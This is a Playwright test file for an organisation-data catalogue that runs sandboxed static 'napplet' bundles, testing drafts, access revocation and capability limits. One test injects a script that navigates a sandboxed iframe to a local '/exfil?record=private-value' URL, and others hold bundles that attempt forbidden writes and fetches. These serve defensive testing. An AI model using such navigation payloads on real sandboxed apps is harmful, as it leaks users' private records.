const { test, expect } = require('playwright/test');
test.setTimeout(45000);

// Synthetic local fixtures exercise TowerSyncService -> Dexie -> liveQuery ->
// Alpine and sandbox controls. Real SQL/auth contract coverage is in Tower.
async function setup(page) {
 await page.route('**/*',r=>{const u=new URL(r.request().url());if(!['localhost','127.0.0.1'].includes(u.hostname))return r.abort();if(u.pathname.startsWith('/api/'))return r.fulfill({status:503,body:'{}'});return r.continue()});
 await page.goto('/');await page.waitForFunction(()=>!!window.Alpine?.store('chat'));
 await page.evaluate(async()=>{
  const {openWorkspaceDb}=await import('/src/db.js');const {hydrateOrgData}=await import('/src/org-data/tower.js');const {TowerSyncService}=await import('/src/tower-sync-service.js');
  const s=window.Alpine.store('chat');s.stopBackgroundSync();s.ensureBackgroundSync=()=>{};s.scheduleBackgroundSync=()=>{};s.showConnectModal=false;s.showWorkspaceBootstrapModal=false;s.startWorkspaceLiveQueries=()=>{};s.syncRoute=()=>{};
  s.session={npub:'synthetic-reader'};s.backendUrl='http://127.0.0.1:3100';s.workspaceDbKey='synthetic-org';s.selectedWorkspaceKey='synthetic-org';s.selectedBoardId='__all__';s.navSection='status';
  s.knownWorkspaces=[{workspaceKey:'synthetic-org',workspaceId:'workspace',workspaceOwnerNpub:'owner',towerServiceNpub:'tower',workspaceServiceNpub:'service',appNpub:'app',directHttpsUrl:'http://127.0.0.1:3100'}];
  const db=openWorkspaceDb('synthetic-org');await db.open();
  const person='11111111-1111-4111-8111-111111111111',team='22222222-2222-4222-8222-222222222222',holiday='33333333-3333-4333-8333-333333333333';
  const fields=(key,type='text',target_type)=>({key,label:key,type,...(target_type?{target_type}:{})});
  const types=[{key:'people',label:'People',fields:[{...fields('name'),required:true},fields('title'),fields('team','record_ref','teams'),fields('manager','record_ref','people'),fields('nostr','nostr_ref')]},{key:'teams',label:'Teams',fields:[fields('name')]},{key:'holidays',label:'Holidays',fields:[fields('person','record_ref','people'),fields('start_date','date'),fields('end_date','date'),fields('status')]}].map(t=>({...t,revision:1,access:{read:'members',write:'members'},capabilities:{read:true,write:true,schema:true}}));
  const records=[{id:person,type_key:'people',revision:1,values:{name:'Alex',title:'Engineer',team,nostr:'npub1synthetic'}},{id:team,type_key:'teams',revision:1,values:{name:'Engineering'}},{id:holiday,type_key:'holidays',revision:1,values:{person,start_date:'2026-12-01',end_date:'2026-12-03',status:'Away'}}];
  const payload={identity:{workspace_id:'workspace',workspace_owner_npub:'owner',tower_service_npub:'tower',workspace_service_npub:'service',app_npub:'app'},workspace_id:'workspace',complete:true,types,records,capabilities:{read:true,write:true,schema:true,publish:true,install:true},installations:[],bundles:[]};
  window.orgFixture={payload,calls:0,mode:'ready',pending:[],writes:[],profiles:[],dms:[]};
  s.openIdentityCard=(_event,npub)=>window.orgFixture.profiles.push(npub);s.createBotDm=npub=>window.orgFixture.dms.push(npub);
  const read=async()=>{const f=window.orgFixture;f.calls++;if(f.mode==='delay')await new Promise(r=>f.pending.push(r));if(f.mode==='failed-read')throw Object.assign(new Error('Service unavailable'),{status:500});if(['denied','conflict-denied'].includes(f.mode))throw Object.assign(new Error('Organisation data access denied'),{status:403});return structuredClone(f.payload)};
  const service=new TowerSyncService({workspaceKey:'synthetic-org',families:{'org-data':{trackFreshness:false,load:(_key,options)=>hydrateOrgData(s,options,{read})}},ports:{prepareCommand:(_name,input)=>({execute:async()=>{
   const f=window.orgFixture;f.writes.push(input);if(f.mode==='write-delay')await new Promise(r=>f.writePending=r);if(f.mode==='write-denied')throw Object.assign(new Error('denied'),{status:403});if(['conflict','conflict-denied'].includes(f.mode))throw new Error('revision_conflict');
   if(input.path==='napplets/bundles'){const b=input.body;const sha=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(b.html));f.bundle={...b,sha256:Array.from(new Uint8Array(sha)).map(n=>n.toString(16).padStart(2,'0')).join('')};f.payload.bundles=[f.bundle];return {bundle:f.bundle}}
   if(input.path.startsWith('napplets/installations/')){f.payload.installations=[{...f.bundle,revision:1}];return {}}
   const id=input.path.split('/').at(-1),row=f.payload.records.find(r=>r.id===id);if(row){row.values=input.body.values;row.revision++}return {record:row};
  }})}});s._towerSyncService=service;s.getTowerSyncService=()=>service;
 });
}
const frame=page=>page.frameLocator('#org-data-modal iframe');
const open=page=>page.evaluate(()=>window.Alpine.store('chat').openOrgData());
for(const width of [1280,390])test(`shared records and modal/menu/history/expand/drafts at ${width}px`,async({page})=>{
 await page.setViewportSize({width,height:900});await setup(page);await open(page);
 await expect(frame(page).getByRole('heading',{name:'Organisation Data Catalogue'})).toBeVisible();
 await expect(page.getByRole('button',{name:'Close Organisation Data Catalogue',exact:true})).toBeFocused();
 await frame(page).getByRole('button',{name:'Edit',exact:true}).click();await frame(page).getByLabel('name *',{exact:true}).fill('Alex Updated');
 const original=await page.locator('#org-data-modal iframe').getAttribute('src');
 await page.getByRole('button',{name:'Expand Organisation Data Catalogue',exact:true}).click();await expect(frame(page).getByLabel('name *',{exact:true})).toHaveValue('Alex Updated');expect(await page.locator('#org-data-modal iframe').getAttribute('src')).toBe(original);
 await page.getByRole('button',{name:'Organisation Data Catalogue menu',exact:true}).click();await page.keyboard.press('Escape');await expect(page.locator('#org-data-modal')).toBeVisible();await expect(page.locator('#org-data-menu')).toBeHidden();await expect(page.getByRole('button',{name:'Organisation Data Catalogue menu',exact:true})).toBeFocused();
 page.once('dialog',d=>d.dismiss());await page.getByRole('button',{name:'Close Organisation Data Catalogue',exact:true}).click();await expect(frame(page).getByLabel('name *',{exact:true})).toHaveValue('Alex Updated');
 await frame(page).getByRole('button',{name:'Save record'}).click();await expect(frame(page).getByRole('cell',{name:'Alex Updated',exact:true})).toBeVisible();
 await frame(page).getByRole('button',{name:'People',exact:true}).click();await expect(frame(page).getByText('Alex Updated',{exact:true})).toBeVisible();
 await frame(page).getByRole('button',{name:'Organisation chart',exact:true}).click();await expect(frame(page).getByText('Alex Updated',{exact:true})).toBeVisible();
 await page.getByRole('button',{name:'Back in napplet history'}).click();await expect(frame(page).getByRole('heading',{name:'People',exact:true})).toBeVisible();
 await frame(page).getByRole('button',{name:'Holiday availability',exact:true}).click();await expect(frame(page).getByRole('cell',{name:'Alex Updated',exact:true})).toBeVisible();await expect(page.getByRole('button',{name:'Forward in napplet history'})).toBeDisabled();
 await frame(page).getByRole('button',{name:'People',exact:true}).click();await frame(page).getByRole('button',{name:'Open profile for Alex Updated'}).click();await expect(page.locator('#org-data-modal')).toBeHidden();expect(await page.evaluate(()=>window.orgFixture.profiles)).toEqual(['npub1synthetic']);
 await page.evaluate(()=>window.Alpine.store('chat').openOrgData({view:'people'}));await frame(page).getByRole('button',{name:'Message',exact:true}).click();expect(await page.evaluate(()=>window.orgFixture.dms)).toEqual(['npub1synthetic']);
 await open(page);await expect(frame(page).getByRole('cell',{name:'Alex Updated',exact:true})).toBeVisible();
 await page.evaluate(()=>{window.orgFixture.mode='denied';window.Alpine.store('chat').refreshOrgData()});await expect(page.locator('#org-data-modal').getByText('Organisation data access denied.',{exact:true})).toBeVisible();await expect(frame(page).getByText('Alex Updated',{exact:true})).toHaveCount(0);
});
test('failed CAS retains editable draft, late reads are rejected on context switch, and immediate reopen works',async({page})=>{
 await setup(page);await open(page);await expect(frame(page).getByRole('button',{name:'Edit',exact:true})).toBeVisible();await frame(page).getByRole('button',{name:'Edit',exact:true}).click();await frame(page).getByLabel('name *',{exact:true}).fill('Retained draft');
 await page.evaluate(()=>window.orgFixture.mode='conflict');await frame(page).getByRole('button',{name:'Save record'}).click();await expect(frame(page).getByText('revision_conflict',{exact:true})).toBeVisible();await expect(frame(page).getByLabel('name *',{exact:true})).toHaveValue('Retained draft');await expect(frame(page).getByRole('button',{name:'Save record'})).toBeEnabled();
 await page.evaluate(()=>window.Alpine.store('chat').closeOrgData(true));await page.evaluate(()=>{window.orgFixture.mode='delay';window.Alpine.store('chat').openOrgData()});await page.waitForFunction(()=>window.orgFixture.pending.length>0);
 await page.evaluate(()=>{window.Alpine.store('chat').selectedBoardId='changed';window.orgFixture.pending.splice(0).forEach(r=>r())});await expect(page.locator('#org-data-modal')).toBeHidden();
 await page.evaluate(()=>{window.orgFixture.mode='ready';window.Alpine.store('chat').openOrgData()});await expect(frame(page).getByRole('heading',{name:'Organisation Data Catalogue'})).toBeVisible();const src=await page.locator('#org-data-modal iframe').getAttribute('src');await open(page);expect(await page.locator('#org-data-modal iframe').getAttribute('src')).toBe(src);await expect(frame(page).getByRole('heading',{name:'Organisation Data Catalogue'})).toBeVisible();
});
test('publish, install and load a static bundle with capability-limited host bridge and no server',async({page})=>{
 await setup(page);await open(page);await expect(frame(page).getByRole('heading',{name:'Organisation Data Catalogue'})).toBeVisible();
 await frame(page).getByText('Static napplets',{exact:true}).click();await frame(page).locator('body').evaluate(()=>parent.postMessage({version:1,session:location.hash.slice(1),type:'ready'},'*'));await frame(page).getByText('Publish a versioned bundle',{exact:true}).click();
 await frame(page).getByLabel('Bundle key',{exact:true}).fill('demo');await frame(page).getByLabel('Title',{exact:true}).fill('Demo');
 const html='<h1>Installed Demo</h1><script>const s=window.nappletSession;parent.postMessage({version:1,session:s,type:"ready"},"*");addEventListener("message",e=>{if(e.data.type==="state"){document.body.dataset.hasData=String(!!e.data.projection)}});fetch("http://127.0.0.1:3100/forbidden").catch(()=>document.body.dataset.network="denied")</script>';
 await frame(page).getByLabel('Static HTML with inline scripts and styles').fill(html);await frame(page).getByLabel('I trust this code and acknowledge the navigation risk').check();await frame(page).getByRole('button',{name:'Publish bundle'}).click();await expect(frame(page).getByRole('heading',{name:'Organisation Data Catalogue'})).toBeVisible();
 await frame(page).getByText('Static napplets',{exact:true}).click();await expect(frame(page).getByText('Declared capabilities: none. Permitted data: none',{exact:true})).toBeVisible();await frame(page).getByRole('button',{name:'Install Demo',exact:true}).click();expect(await page.evaluate(()=>window.orgFixture.payload.installations.length)).toBe(0);await frame(page).getByLabel('I trust Demo and acknowledge the navigation risk').check();await frame(page).getByRole('button',{name:'Install Demo',exact:true}).click();await expect(frame(page).getByRole('heading',{name:'Organisation Data Catalogue'})).toBeVisible();await frame(page).getByText('Static napplets',{exact:true}).click();await frame(page).getByRole('button',{name:'Open Demo (v1)'}).click();await expect(frame(page).getByRole('heading',{name:'Installed Demo'})).toBeVisible();
 await expect(frame(page).locator('body')).toHaveAttribute('data-has-data','false');await expect(frame(page).locator('body')).toHaveAttribute('data-network','denied');expect(await page.locator('#org-data-modal iframe').getAttribute('sandbox')).toBe('allow-scripts');
 await page.evaluate(()=>{window.orgFixture.mode='denied';window.Alpine.store('chat').refreshOrgData()});await expect(page.locator('#org-data-modal iframe')).toBeHidden();await expect(page.locator('#org-data-modal').getByText('Organisation data access denied.',{exact:true})).toBeVisible();
});

for(const mode of ['denied','restricted','write-denied','failed-read','conflict-denied'])test(`dirty populated form loses secrets after ${mode}`,async({page})=>{
 await setup(page);await open(page);await frame(page).getByRole('button',{name:'Edit',exact:true}).click();await frame(page).getByLabel('name *',{exact:true}).fill('private-value');
 const writes=await page.evaluate(()=>window.orgFixture.writes.length);
 await page.evaluate(mode=>{const f=window.orgFixture,s=window.Alpine.store('chat');if(mode==='restricted'){f.payload.types=f.payload.types.filter(t=>t.key!=='people');f.payload.records=f.payload.records.filter(r=>r.type_key!=='people');s.syncOrgData()}else if(['write-denied','conflict-denied'].includes(mode)){f.mode=mode}else{f.mode=mode;s.syncOrgData()}},mode);
 if(['write-denied','conflict-denied'].includes(mode))await frame(page).getByRole('button',{name:'Save record'}).click();
 await expect(frame(page).getByLabel('name *',{exact:true})).toHaveCount(0);
 await expect(frame(page).getByRole('button',{name:'Save record'})).toHaveCount(0);
 expect(await page.locator('#org-data-modal iframe').evaluate(f=>f.contentDocument?.body?.textContent||'')).not.toContain('private-value');
 await page.evaluate(()=>window.Alpine.store('chat').writeOrgData({path:'types/people/records/11111111-1111-4111-8111-111111111111',method:'PATCH',body:{values:{name:'unauthorised'},expected_revision:1}}));
 if(mode!=='restricted'){expect(await page.evaluate(()=>window.orgFixture.writes.length)).toBe(writes+(['write-denied','conflict-denied'].includes(mode)?1:0));await expect.poll(()=>page.evaluate(async()=>{const {getWorkspaceDb}=await import('/src/db.js');return getWorkspaceDb().org_data.count()})).toBe(0);}
});
test('dirty invalidation reauthorizes and preserves an ordinary CAS draft only with unchanged access',async({page})=>{
 await setup(page);await open(page);await frame(page).getByRole('button',{name:'Edit',exact:true}).click();await frame(page).getByLabel('name *',{exact:true}).fill('Authorised draft');
 const reads=await page.evaluate(()=>window.orgFixture.calls);await page.evaluate(()=>window.Alpine.store('chat').syncOrgData());await expect(frame(page).getByLabel('name *',{exact:true})).toHaveValue('Authorised draft');await expect(frame(page).getByText('Shared data changed. Save checks your revision; refresh discards the draft.')).toBeVisible();expect(await page.evaluate(()=>window.orgFixture.calls)).toBeGreaterThan(reads);
});
test('trusted script ignores state but host destroys its inaccessible document; undeclared writes denied',async({page})=>{
 await setup(page);
 await page.evaluate(async()=>{const f=window.orgFixture;const html='<input value="private-value"><script>parent.postMessage({version:1,session:window.nappletSession,type:"ready"},"*");parent.postMessage({version:1,session:window.nappletSession,type:"write",path:"bootstrap",method:"POST",body:{}},"*")</script>';const hash=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(html));f.payload.installations=[{key:'ignores',title:'Ignores',version:1,revision:1,bridge_version:1,capabilities:['org_data.read'],sha256:Array.from(new Uint8Array(hash)).map(n=>n.toString(16).padStart(2,'0')).join(''),html}];window.Alpine.store('chat').openOrgData({view:'bundle:ignores'})});
 await expect(frame(page).locator('input')).toHaveValue('private-value');expect(await page.evaluate(()=>window.orgFixture.writes)).toHaveLength(0);
 await page.evaluate(()=>{window.orgFixture.mode='denied';window.Alpine.store('chat').syncOrgData()});await expect(page.locator('#org-data-modal').getByText('Organisation data access denied.',{exact:true})).toBeVisible();await expect(frame(page).locator('input')).toHaveCount(0);expect(await page.locator('#org-data-modal iframe').getAttribute('srcdoc')).not.toContain('private-value');
});
test('resource CSP honestly allows iframe self-navigation to an ephemeral HTTP fixture',async({page})=>{
 const http=require('node:http');let request;const server=http.createServer((req,res)=>{request=req.url;res.end('Navigation received')});await new Promise(r=>server.listen(0,'127.0.0.1',r));
 try{await setup(page);const port=server.address().port;
 await page.evaluate(async port=>{const {sandboxBundle}=await import('/src/org-data/projection.js');const f=document.createElement('iframe');f.sandbox='allow-scripts';f.srcdoc=sandboxBundle('<script>location.href="http://127.0.0.1:'+port+'/exfil?record=private-value"</script>','proof');document.body.append(f)},port);
 await expect.poll(()=>request).toBe('/exfil?record=private-value');
 }finally{await new Promise(r=>server.close(r))}
});

test('revocation invalidation rechecks authority during an in-flight save',async({page})=>{
 await setup(page);await open(page);await frame(page).getByRole('button',{name:'Edit',exact:true}).click();await frame(page).getByLabel('name *',{exact:true}).fill('private-value');
 await page.evaluate(()=>window.orgFixture.mode='write-delay');await frame(page).getByRole('button',{name:'Save record'}).click();await page.waitForFunction(()=>!!window.orgFixture.writePending);
 await page.evaluate(()=>{window.orgFixture.mode='denied';window.Alpine.store('chat').syncOrgData()});await expect(page.locator('#org-data-modal').getByText('Organisation data access denied.',{exact:true})).toBeVisible();await expect(frame(page).locator('input')).toHaveCount(0);
 await page.evaluate(()=>window.orgFixture.writePending());await expect(frame(page).locator('input')).toHaveCount(0);
});
